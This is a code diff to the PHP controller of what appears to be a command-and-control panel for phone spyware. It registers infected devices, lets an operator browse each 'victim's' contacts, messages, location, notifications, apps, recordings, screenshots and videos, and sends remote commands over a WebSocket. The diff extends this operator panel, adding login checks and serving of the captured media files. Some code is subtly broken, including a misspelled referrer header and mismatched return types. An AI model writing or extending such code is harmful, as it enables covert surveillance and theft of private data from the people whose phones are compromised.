@@ -5,7 +5,6 @@ namespace Server\Controller;
 use Locale;
 use Server\Model\Client;
 use Server\Controller\Base;
-use Server\Library\WebSocketClient;
 use Server\Model\Contact;
 use Server\Model\Image;
 use Server\Model\InstalledApp;
@@ -24,12 +23,9 @@ class ControlPanel extends Base
     /** @var string $webSocketURI Web Socket URI */
     private string $webSocketURI = "ws://localhost:8080";
 
-    private WebSocketClient $socketClient;
-
-    public function __construct(WebSocketClient $webSocketClient)
+    public function __construct()
     {
         parent::__construct();
-        $this->socketClient = $webSocketClient;
     }
 
     /**
@@ -37,6 +33,11 @@ class ControlPanel extends Base
      */
     public function home(): void
     {
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
+
         $clients = $this->getClients();
         render('home.php', ['clients' => $clients]);
     }
@@ -46,11 +47,27 @@ class ControlPanel extends Base
      */
     public function contacts(): void
     {
-        if (!$this->isClientIdSet())
-            header("/");
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
+
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
 
         $contacts = $this->getContacts($_GET['client']);
-        render('features/contacts.php', ['contacts' => $contacts]);
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/contacts.php',
+            [
+                'webSocketID' => $webSocketID,
+                'contacts' => $contacts,
+                'device' => $device
+            ]
+        );
     }
 
     /**
@@ -58,18 +75,55 @@ class ControlPanel extends Base
      */
     public function images(): void
     {
-        if (!$this->isClientIdSet())
-            header("/");
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
+
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
 
         if ($this->isVictimPropertyIdSet()) {
             $query = "SELECT * FROM IMAGE WHERE client_id=? AND id=?";
             $rows = $this->database->select($query, [$_GET['client'], $_GET['id']]);
+            if (count($rows) > 0) {
+                // Path to your file
+                $file_path = __DIR__ . "/../../../files/images/" . $rows[0]['filename'];
 
-            
+                // Create a fileinfo resource
+                $finfo = finfo_open(FILEINFO_MIME_TYPE);
+
+                // Get the MIME type of the file
+                $mime_type = finfo_file($finfo, $file_path);
+
+                // Close the fileinfo resource
+                finfo_close($finfo);
+
+                // Set the Content-Type header based on the MIME type
+                header("Content-Type: $mime_type");
+
+                // Output the content of the file
+                readfile($file_path);
+
+                return;
+            }
+
+            return;
         }
 
         $images = $this->getImages($_GET['client']);
-        render('features/images.php', ['images' => $images]);
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/images.php',
+            [
+                'webSocketID' => $webSocketID,
+                'images' => $images,
+                'device' => $device
+            ]
+        );
     }
 
     /**
@@ -77,11 +131,27 @@ class ControlPanel extends Base
      */
     public function installedApps(): void
     {
-        if (!$this->isClientIdSet())
-            header("/");
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
+
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
 
         $installedApps = $this->getInstalledApps($_GET['client']);
-        render('features/apps.php', ['installedApps' => $installedApps]);
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/apps.php',
+            [
+                'webSocketID' => $webSocketID,
+                'installedApps' => $installedApps,
+                'device' => $device
+            ]
+        );
     }
 
     /**
@@ -89,11 +159,27 @@ class ControlPanel extends Base
      */
     public function location(): void
     {
-        if (!$this->isClientIdSet())
-            header("/");
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
+
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
 
         $knownLocations = $this->getKnownLocations($_GET['client']);
-        render('features/location.php', ['knownLocations' => $knownLocations]);
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/location.php',
+            [
+                'webSocketID' => $webSocketID,
+                'knownLocations' => $knownLocations,
+                'device' => $device
+            ]
+        );
     }
 
     /**
@@ -101,11 +187,27 @@ class ControlPanel extends Base
      */
     public function messages(): void
     {
-        if (!$this->isClientIdSet())
-            header("/");
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
+
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
 
         $messages = $this->getMessages($_GET['client']);
-        render('features/messages.php', ['messages' => $messages]);
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/messages.php',
+            [
+                'webSocketID' => $webSocketID,
+                'messages' => $messages,
+                'device' => $device
+            ]
+        );
     }
 
     /**
@@ -113,11 +215,27 @@ class ControlPanel extends Base
      */
     public function notifications(): void
     {
-        if (!$this->isClientIdSet())
-            header("/");
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
+
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
 
         $notifications = $this->getNotifications($_GET['client']);
-        render('features/notifications.php', ['notifications' => $notifications]);
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/notifications.php',
+            [
+                'webSocketID' => $webSocketID,
+                'notifications' => $notifications,
+                'device' => $device
+            ]
+        );
     }
 
     /**
@@ -125,15 +243,55 @@ class ControlPanel extends Base
      */
     public function recordings(): void
     {
-        if (!$this->isClientIdSet())
-            header("/");
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
 
-        if (isset($_GET['id'])) {
-        
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
+
+        if ($this->isVictimPropertyIdSet()) {
+            $query = "SELECT * FROM RECORDING WHERE client_id=? AND id=?";
+            $rows = $this->database->select($query, [$_GET['client'], $_GET['id']]);
+            if (count($rows) > 0) {
+                // Path to your file
+                $file_path = __DIR__ . "/../../../files/recordings/" . $rows[0]['filename'];
+
+                // Create a fileinfo resource
+                $finfo = finfo_open(FILEINFO_MIME_TYPE);
+
+                // Get the MIME type of the file
+                $mime_type = finfo_file($finfo, $file_path);
+
+                // Close the fileinfo resource
+                finfo_close($finfo);
+
+                // Set the Content-Type header based on the MIME type
+                header("Content-Type: $mime_type");
+
+                // Output the content of the file
+                readfile($file_path);
+
+                return;
+            }
+
+            return;
         }
 
         $recordings = $this->getRecordings($_GET['client']);
-        render('features/recordings.php', ['recordings' => $recordings]);
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/recordings.php',
+            [
+                'webSocketID' => $webSocketID,
+                'recordings' => $recordings,
+                'device' => $device
+            ]
+        );
     }
 
     /**
@@ -141,15 +299,55 @@ class ControlPanel extends Base
      */
     public function screenshots(): void
     {
-        if (!$this->isClientIdSet())
-            header("/");
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
 
-        if (isset($_GET['id'])) {
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
 
+        if ($this->isVictimPropertyIdSet()) {
+            $query = "SELECT * FROM SCREENSHOT WHERE client_id=? AND id=?";
+            $rows = $this->database->select($query, [$_GET['client'], $_GET['id']]);
+            if (count($rows) > 0) {
+                // Path to your file
+                $file_path = __DIR__ . "/../../../files/screenshots/" . $rows[0]['filename'];
+
+                // Create a fileinfo resource
+                $finfo = finfo_open(FILEINFO_MIME_TYPE);
+
+                // Get the MIME type of the file
+                $mime_type = finfo_file($finfo, $file_path);
+
+                // Close the fileinfo resource
+                finfo_close($finfo);
+
+                // Set the Content-Type header based on the MIME type
+                header("Content-Type: $mime_type");
+
+                // Output the content of the file
+                readfile($file_path);
+
+                return;
+            }
+
+            return;
         }
 
         $screenshots = $this->getScreenshots($_GET['screenshots']);
-        render('features/screeshots.php', ['screenshots' => $screenshots]);
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/screenshots.php',
+            [
+                'webSocketID' => $webSocketID,
+                'screenshots' => $screenshots,
+                'device' => $device
+            ]
+        );
     }
 
     /**
@@ -157,15 +355,55 @@ class ControlPanel extends Base
      */
     public function videos(): void
     {
-        if (!$this->isClientIdSet())
-            header("/");
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
+            return;
+        }
 
-        if (isset($_GET['id'])) {
-        
+        if (!$this->isClientIdSet()) {
+            header("Location: /");
+            return;
+        }
+
+        if ($this->isVictimPropertyIdSet()) {
+            $query = "SELECT * FROM VIDEO WHERE client_id=? AND id=?";
+            $rows = $this->database->select($query, [$_GET['client'], $_GET['id']]);
+            if (count($rows) > 0) {
+                // Path to your file
+                $file_path = __DIR__ . "/../../../files/videos/" . $rows[0]['filename'];
+
+                // Create a fileinfo resource
+                $finfo = finfo_open(FILEINFO_MIME_TYPE);
+
+                // Get the MIME type of the file
+                $mime_type = finfo_file($finfo, $file_path);
+
+                // Close the fileinfo resource
+                finfo_close($finfo);
+
+                // Set the Content-Type header based on the MIME type
+                header("Content-Type: $mime_type");
+
+                // Output the content of the file
+                readfile($file_path);
+
+                return;
+            }
+
+            return;
         }
 
         $videos = $this->getVideos($_GET['client']);
-        render('features/videos.php', ['videos' => $videos]);
+        $webSocketID = $this->getClientWebSocketID($_GET['client']);
+        $device = $this->getDeviceName($_GET['client']);
+        render(
+            'features/videos.php',
+            [
+                'webSocketID' => $webSocketID,
+                'videos' => $videos,
+                'device' => $device
+            ]
+        );
     }
 
     /**
@@ -176,19 +414,19 @@ class ControlPanel extends Base
     public function createClient(): string
     {
         if (!isset($_POST['phone']))
-            return null;
+            return json_encode([]);
 
         if (!isset($_POST['device_api']))
-            return null;
+            return json_encode([]);
 
         if (!isset($_POST['device_id']))
-            return null;
+            return json_encode([]);
 
         if (!isset($_POST['device_model']))
-            return null;
+            return json_encode([]);
 
         if (!isset($_POST['ip_address']))
-            return null;
+            return json_encode([]);
 
         $query = "INSERT INTO CLIENT(model, device_id, ip_address, device_api, phone) VALUES(?, ?, ?, ?, ?)";
         $data = [
@@ -208,8 +446,8 @@ class ControlPanel extends Base
         ];
         $rows = $this->database->select($query, $data);
         $response = [];
-        foreach ($response as $data) {
-            $response['client_id'] = $data['id'];
+        foreach ($rows as $row) {
+            $response['client_id'] = $row['id'];
             break;
         }
 
@@ -236,8 +474,23 @@ class ControlPanel extends Base
      */
     public function sendCommand(): void
     {
-        if (!isset($_POST['cmd']))
+        if (!$this->isLoggedIn()) {
+            header("Location: /login");
             return;
+        }
+
+        if (!isset($_POST['cmd'])) {
+            header("Location: /");
+            return;
+        }
+
+        if (!isset($_POST['web_socket_id'])) {
+            header("Location: /");
+            return;
+        }
+
+        parse_str(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_QUERY), $queries);
+
 
         $client = new TextTalkWebSocket($this->webSocketURI);
 
@@ -251,8 +504,10 @@ class ControlPanel extends Base
             // Close the WebSocket connection
             $client->close();
         } catch (\Exception $e) {
-            echo "Error: " . $e->getMessage() . "\n";
+            header("Location: " . $_SERVER['HTTP_REFERRER'] . "?client=" . $queries['client'] . "&alert=0");
         }
+
+        header("Location: " . $_SERVER['HTTP_REFERRER'] . "?client=" . $queries['client'] . "&alert=1");
     }
 
     /**
@@ -411,7 +666,7 @@ class ControlPanel extends Base
         $rows = $this->database->select($query, [$victimID]);
 
         foreach ($rows as $row) {
-            $messages = new Notification(
+            $notifications = new Notification(
                 $row['id'],
                 $row['client_id'],
                 $row['sender'],
@@ -505,9 +760,6 @@ class ControlPanel extends Base
         if (!isset($_GET['client']))
             return false;
 
-        if (!is_int($_GET['client'])) 
-            return false;
-
         return true;
     }
 
@@ -521,9 +773,42 @@ class ControlPanel extends Base
         if (!isset($_GET['id']))
             return false;
 
-        if (!is_int($_GET['id'])) 
-            return false;
-
         return true;
+    }
+
+    /**
+     * Get client web socket id
+     * 
+     * @param int $clientID
+     * 
+     * @return string
+     */
+    private function getClientWebSocketID(int $clientID): int
+    {
+        $query = "SELECT web_socket_id FROM CLIENT WHERE id=?";
+        $rows = $this->database->select($query, [$clientID]);
+        
+        if (count($rows) > 0)
+            return $rows[0]['web_socket_id'];
+
+        return -1;
+    }
+
+    /**
+     * Get client device name
+     * 
+     * @param int $clientID
+     * 
+     * @return string
+     */
+    private function getDeviceName(int $clientID): string
+    {
+        $query = "SELECT * FROM CLIENT WHERE id=?";
+        $rows = $this->database->select($query, [$clientID]);
+
+        if (count($rows) > 0)
+            return $rows[0]['model'] . " " . $rows[0]['device_id'];
+
+        return "";
     }
 }
